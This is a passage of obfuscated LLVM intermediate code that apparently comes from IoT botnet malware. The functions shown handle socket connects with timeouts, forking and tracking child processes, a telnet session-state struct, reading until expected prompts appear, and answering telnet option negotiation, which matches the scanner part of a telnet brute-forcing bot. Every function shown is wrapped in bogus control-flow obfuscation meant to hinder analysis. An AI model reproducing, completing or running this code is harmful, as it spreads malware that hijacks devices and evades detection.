originalBB1:                                      ; preds = %originalBB1alteredBB, %65
  %74 = load i32, i32* %9, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %75, i64* %76, align 8
  %77 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %77, align 8
  %78 = load i32, i32* @x.43
  %79 = load i32, i32* @y.44
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %86

; <label>:86:                                     ; preds = %originalBBpart24
  %87 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %87, i64 0, i64 0
  %89 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %88) #3, !srcloc !3
  %90 = extractvalue { i64, i64* } %89, 0
  %91 = extractvalue { i64, i64* } %89, 1
  %92 = trunc i64 %90 to i32
  store i32 %92, i32* %17, align 4
  %93 = ptrtoint i64* %91 to i64
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %18, align 4
  br label %95

; <label>:95:                                     ; preds = %86
  %96 = load i32, i32* @x.43
  %97 = load i32, i32* @y.44
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %95
  %104 = load i32, i32* %6, align 4
  %105 = srem i32 %104, 64
  %106 = zext i32 %105 to i64
  %107 = shl i64 1, %106
  %108 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %109 = load i32, i32* %6, align 4
  %110 = sdiv i32 %109, 64
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds [16 x i64], [16 x i64]* %108, i64 0, i64 %111
  %113 = load i64, i64* %112, align 8
  %114 = or i64 %113, %107
  store i64 %114, i64* %112, align 8
  %115 = load i32, i32* %6, align 4
  %116 = add nsw i32 %115, 1
  %117 = call i32 @select(i32 %116, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %118 = icmp sgt i32 %117, 0
  %119 = load i32, i32* @x.43
  %120 = load i32, i32* @y.44
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart227, label %originalBB6alteredBB

originalBBpart227:                                ; preds = %originalBB6
  br i1 %118, label %127, label %167

; <label>:127:                                    ; preds = %originalBBpart227
  %128 = load i32, i32* @x.43
  %129 = load i32, i32* @y.44
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %127
  store i32 4, i32* %13, align 4
  %136 = load i32, i32* %6, align 4
  %137 = bitcast i32* %14 to i8*
  %138 = call i32 @getsockopt(i32 %136, i32 1, i32 4, i8* %137, i32* %13) #3
  %139 = load i32, i32* %14, align 4
  %140 = icmp ne i32 %139, 0
  %141 = load i32, i32* @x.43
  %142 = load i32, i32* @y.44
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %140, label %149, label %150

; <label>:149:                                    ; preds = %originalBBpart231
  store i32 0, i32* %5, align 4
  br label %212

; <label>:150:                                    ; preds = %originalBBpart231
  %151 = load i32, i32* @x.43
  %152 = load i32, i32* @y.44
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %150
  %159 = load i32, i32* @x.43
  %160 = load i32, i32* @y.44
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %184

; <label>:167:                                    ; preds = %originalBBpart227
  %168 = load i32, i32* @x.43
  %169 = load i32, i32* @y.44
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %167
  store i32 0, i32* %5, align 4
  %176 = load i32, i32* @x.43
  %177 = load i32, i32* @y.44
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %212

; <label>:184:                                    ; preds = %originalBBpart235
  br label %186

; <label>:185:                                    ; preds = %originalBBpart2
  store i32 0, i32* %5, align 4
  br label %212

; <label>:186:                                    ; preds = %184
  %187 = load i32, i32* @x.43
  %188 = load i32, i32* @y.44
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %186
  %195 = load i32, i32* @x.43
  %196 = load i32, i32* @y.44
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %203

; <label>:203:                                    ; preds = %originalBBpart243, %37
  %204 = load i32, i32* %6, align 4
  %205 = call i32 (i32, i32, ...) @fcntl(i32 %204, i32 3, i8* null)
  %206 = sext i32 %205 to i64
  store i64 %206, i64* %15, align 8
  %207 = load i64, i64* %15, align 8
  %208 = and i64 %207, -2049
  store i64 %208, i64* %15, align 8
  %209 = load i32, i32* %6, align 4
  %210 = load i64, i64* %15, align 8
  %211 = call i32 (i32, i32, ...) @fcntl(i32 %209, i32 4, i64 %210)
  store i32 1, i32* %5, align 4
  br label %212

; <label>:212:                                    ; preds = %203, %185, %originalBBpart239, %149, %36
  %213 = load i32, i32* %5, align 4
  ret i32 %213

originalBBalteredBB:                              ; preds = %originalBB, %45
  %214 = call i32* @__errno_location() #10
  %215 = load i32, i32* %214, align 4
  %216 = icmp eq i32 %215, 115
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %65
  %217 = load i32, i32* %9, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %218, i64* %219, align 8
  %220 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %220, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %95
  %221 = load i32, i32* %6, align 4
  %_ = sub i32 %221, 64
  %gen = mul i32 %_, 64
  %_7 = shl i32 %221, 64
  %_8 = shl i32 %221, 64
  %_9 = sub i32 0, %221
  %gen10 = add i32 %_9, 64
  %_11 = shl i32 %221, 64
  %222 = srem i32 %221, 64
  %223 = zext i32 %222 to i64
  %224 = shl i64 1, %223
  %225 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %226 = load i32, i32* %6, align 4
  %_12 = shl i32 %226, 64
  %_13 = sub i32 %226, 64
  %gen14 = mul i32 %_13, 64
  %_15 = sub i32 %226, 64
  %gen16 = mul i32 %_15, 64
  %_17 = shl i32 %226, 64
  %_18 = sub i32 %226, 64
  %gen19 = mul i32 %_18, 64
  %227 = sdiv i32 %226, 64
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds [16 x i64], [16 x i64]* %225, i64 0, i64 %228
  %230 = load i64, i64* %229, align 8
  %_20 = sub i64 %230, %224
  %gen21 = mul i64 %_20, %224
  %_22 = shl i64 %230, %224
  %231 = or i64 %230, %224
  store i64 %231, i64* %229, align 8
  %232 = load i32, i32* %6, align 4
  %_23 = sub i32 %232, 1
  %gen24 = mul i32 %_23, 1
  %233 = add nsw i32 %232, 1
  %234 = call i32 @select(i32 %233, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %235 = icmp sgt i32 %234, 0
  br label %originalBB6

originalBB29alteredBB:                            ; preds = %originalBB29, %127
  store i32 4, i32* %13, align 4
  %236 = load i32, i32* %6, align 4
  %237 = bitcast i32* %14 to i8*
  %238 = call i32 @getsockopt(i32 %236, i32 1, i32 4, i8* %237, i32* %13) #3
  %239 = load i32, i32* %14, align 4
  %240 = icmp ne i32 %239, 0
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %150
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %167
  store i32 0, i32* %5, align 4
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %186
  br label %originalBB41
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = load i32, i32* @x.45
  %2 = load i32, i32* @y.46
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32*, align 8
  %12 = alloca i32, align 4
  %13 = call i32 @fork() #3
  store i32 %13, i32* %10, align 4
  %14 = load i32, i32* %10, align 4
  %15 = icmp ule i32 %14, 0
  %16 = load i32, i32* @x.45
  %17 = load i32, i32* @y.46
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %15, label %24, label %26

; <label>:24:                                     ; preds = %originalBBpart2
  %25 = load i32, i32* %10, align 4
  store i32 %25, i32* %9, align 4
  br label %79

; <label>:26:                                     ; preds = %originalBBpart2
  %27 = load i64, i64* @numpids, align 8
  %28 = add i64 %27, 1
  store i64 %28, i64* @numpids, align 8
  %29 = load i64, i64* @numpids, align 8
  %30 = add i64 %29, 1
  %31 = mul i64 %30, 4
  %32 = call noalias i8* @malloc(i64 %31) #3
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %11, align 8
  store i32 0, i32* %12, align 4
  br label %34

; <label>:34:                                     ; preds = %66, %26
  %35 = load i32, i32* @x.45
  %36 = load i32, i32* @y.46
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load i32, i32* %12, align 4
  %44 = zext i32 %43 to i64
  %45 = load i64, i64* @numpids, align 8
  %46 = sub i64 %45, 1
  %47 = icmp ult i64 %44, %46
  %48 = load i32, i32* @x.45
  %49 = load i32, i32* @y.46
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart27, label %originalBB1alteredBB

originalBBpart27:                                 ; preds = %originalBB1
  br i1 %47, label %56, label %69

; <label>:56:                                     ; preds = %originalBBpart27
  %57 = load i32*, i32** @pids, align 8
  %58 = load i32, i32* %12, align 4
  %59 = zext i32 %58 to i64
  %60 = getelementptr inbounds i32, i32* %57, i64 %59
  %61 = load i32, i32* %60, align 4
  %62 = load i32*, i32** %11, align 8
  %63 = load i32, i32* %12, align 4
  %64 = zext i32 %63 to i64
  %65 = getelementptr inbounds i32, i32* %62, i64 %64
  store i32 %61, i32* %65, align 4
  br label %66

; <label>:66:                                     ; preds = %56
  %67 = load i32, i32* %12, align 4
  %68 = add i32 %67, 1
  store i32 %68, i32* %12, align 4
  br label %34

; <label>:69:                                     ; preds = %originalBBpart27
  %70 = load i32, i32* %10, align 4
  %71 = load i32*, i32** %11, align 8
  %72 = load i64, i64* @numpids, align 8
  %73 = sub i64 %72, 1
  %74 = getelementptr inbounds i32, i32* %71, i64 %73
  store i32 %70, i32* %74, align 4
  %75 = load i32*, i32** @pids, align 8
  %76 = bitcast i32* %75 to i8*
  call void @free(i8* %76) #3
  %77 = load i32*, i32** %11, align 8
  store i32* %77, i32** @pids, align 8
  %78 = load i32, i32* %10, align 4
  store i32 %78, i32* %9, align 4
  br label %79

; <label>:79:                                     ; preds = %69, %24
  %80 = load i32, i32* %9, align 4
  ret i32 %80

originalBBalteredBB:                              ; preds = %originalBB, %0
  %81 = alloca i32, align 4
  %82 = alloca i32, align 4
  %83 = alloca i32*, align 8
  %84 = alloca i32, align 4
  %85 = call i32 @fork() #3
  store i32 %85, i32* %82, align 4
  %86 = load i32, i32* %82, align 4
  %87 = icmp ule i32 %86, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %88 = load i32, i32* %12, align 4
  %89 = zext i32 %88 to i64
  %90 = load i64, i64* @numpids, align 8
  %_ = sub i64 0, %90
  %gen = add i64 %_, 1
  %_2 = shl i64 %90, 1
  %_3 = shl i64 %90, 1
  %_4 = sub i64 0, %90
  %gen5 = add i64 %_4, 1
  %91 = sub i64 %90, 1
  %92 = icmp ult i64 %89, %91
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #3
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %54

; <label>:37:                                     ; preds = %31
  %38 = load i32, i32* @x.49
  %39 = load i32, i32* @y.50
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  store i32 0, i32* %6, align 4
  %46 = load i32, i32* @x.49
  %47 = load i32, i32* @y.50
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %54

; <label>:54:                                     ; preds = %originalBBpart2, %36
  %55 = load i32, i32* %6, align 4
  ret i32 %55

originalBBalteredBB:                              ; preds = %originalBB, %37
  store i32 0, i32* %6, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = load i32, i32* @x.51
  %6 = load i32, i32* @y.52
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca %struct.fd_set, align 8
  %19 = alloca %struct.timeval, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i32 %0, i32* %14, align 4
  store i32 %1, i32* %15, align 4
  store i8* %2, i8** %16, align 8
  store i32 %3, i32* %17, align 4
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 0
  store i64 0, i64* %22, align 8
  %23 = load i32, i32* %15, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 1
  store i64 %24, i64* %25, align 8
  %26 = load i32, i32* @x.51
  %27 = load i32, i32* @y.52
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %35, i64 0, i64 0
  %37 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %36) #3, !srcloc !4
  %38 = extractvalue { i64, i64* } %37, 0
  %39 = extractvalue { i64, i64* } %37, 1
  %40 = trunc i64 %38 to i32
  store i32 %40, i32* %20, align 4
  %41 = ptrtoint i64* %39 to i64
  %42 = trunc i64 %41 to i32
  store i32 %42, i32* %21, align 4
  br label %43

; <label>:43:                                     ; preds = %34
  %44 = load i32, i32* %14, align 4
  %45 = srem i32 %44, 64
  %46 = zext i32 %45 to i64
  %47 = shl i64 1, %46
  %48 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %49 = load i32, i32* %14, align 4
  %50 = sdiv i32 %49, 64
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [16 x i64], [16 x i64]* %48, i64 0, i64 %51
  %53 = load i64, i64* %52, align 8
  %54 = or i64 %53, %47
  store i64 %54, i64* %52, align 8
  %55 = load i32, i32* %14, align 4
  %56 = add nsw i32 %55, 1
  %57 = call i32 @select(i32 %56, %struct.fd_set* %18, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %19)
  %58 = icmp slt i32 %57, 1
  br i1 %58, label %59, label %76

; <label>:59:                                     ; preds = %43
  %60 = load i32, i32* @x.51
  %61 = load i32, i32* @y.52
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %59
  store i32 0, i32* %13, align 4
  %68 = load i32, i32* @x.51
  %69 = load i32, i32* @y.52
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %83

; <label>:76:                                     ; preds = %43
  %77 = load i32, i32* %14, align 4
  %78 = load i8*, i8** %16, align 8
  %79 = load i32, i32* %17, align 4
  %80 = sext i32 %79 to i64
  %81 = call i64 @recv(i32 %77, i8* %78, i64 %80, i32 0)
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %13, align 4
  br label %83

; <label>:83:                                     ; preds = %76, %originalBBpart24
  %84 = load i32, i32* %13, align 4
  ret i32 %84

originalBBalteredBB:                              ; preds = %originalBB, %4
  %85 = alloca i32, align 4
  %86 = alloca i32, align 4
  %87 = alloca i32, align 4
  %88 = alloca i8*, align 8
  %89 = alloca i32, align 4
  %90 = alloca %struct.fd_set, align 8
  %91 = alloca %struct.timeval, align 8
  %92 = alloca i32, align 4
  %93 = alloca i32, align 4
  store i32 %0, i32* %86, align 4
  store i32 %1, i32* %87, align 4
  store i8* %2, i8** %88, align 8
  store i32 %3, i32* %89, align 4
  %94 = getelementptr inbounds %struct.timeval, %struct.timeval* %91, i32 0, i32 0
  store i64 0, i64* %94, align 8
  %95 = load i32, i32* %87, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.timeval, %struct.timeval* %91, i32 0, i32 1
  store i64 %96, i64* %97, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %59
  store i32 0, i32* %13, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.53
  %5 = load i32, i32* @y.54
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %17 = load i8*, i8** %14, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = load i32, i32* @x.53
  %22 = load i32, i32* @y.54
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  switch i32 %20, label %93 [
    i32 255, label %29
    i32 251, label %30
    i32 252, label %30
    i32 253, label %30
    i32 254, label %30
  ]

; <label>:29:                                     ; preds = %originalBBpart2
  store i32 0, i32* %12, align 4
  br label %111

; <label>:30:                                     ; preds = %originalBBpart2, %originalBBpart2, %originalBBpart2, %originalBBpart2
  store i8 -1, i8* %16, align 1
  %31 = load i32, i32* %13, align 4
  %32 = call i64 @send(i32 %31, i8* %16, i64 1, i32 16384)
  %33 = load i8*, i8** %14, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 252, %36
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %30
  store i8 -2, i8* %16, align 1
  br label %86

; <label>:39:                                     ; preds = %30
  %40 = load i8*, i8** %14, align 8
  %41 = getelementptr inbounds i8, i8* %40, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 254, %43
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %39
  store i8 -4, i8* %16, align 1
  br label %85

; <label>:46:                                     ; preds = %39
  %47 = load i32, i32* @x.53
  %48 = load i32, i32* @y.54
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i8*, i8** %14, align 8
  %56 = getelementptr inbounds i8, i8* %55, i64 1
  %57 = load i8, i8* %56, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 3, %58
  %60 = load i32, i32* @x.53
  %61 = load i32, i32* @y.54
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %59, label %68, label %76

; <label>:68:                                     ; preds = %originalBBpart24
  %69 = load i8*, i8** %14, align 8
  %70 = getelementptr inbounds i8, i8* %69, i64 1
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 253
  %74 = select i1 %73, i32 251, i32 253
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %16, align 1
  br label %84

; <label>:76:                                     ; preds = %originalBBpart24
  %77 = load i8*, i8** %14, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 1
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 253
  %82 = select i1 %81, i32 252, i32 254
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %16, align 1
  br label %84

; <label>:84:                                     ; preds = %76, %68
  br label %85

; <label>:85:                                     ; preds = %84, %45
  br label %86

; <label>:86:                                     ; preds = %85, %38
  %87 = load i32, i32* %13, align 4
  %88 = call i64 @send(i32 %87, i8* %16, i64 1, i32 16384)
  %89 = load i32, i32* %13, align 4
  %90 = load i8*, i8** %14, align 8
  %91 = getelementptr inbounds i8, i8* %90, i64 2
  %92 = call i64 @send(i32 %89, i8* %91, i64 1, i32 16384)
  br label %110

; <label>:93:                                     ; preds = %originalBBpart2
  %94 = load i32, i32* @x.53
  %95 = load i32, i32* @y.54
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %93
  %102 = load i32, i32* @x.53
  %103 = load i32, i32* @y.54
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
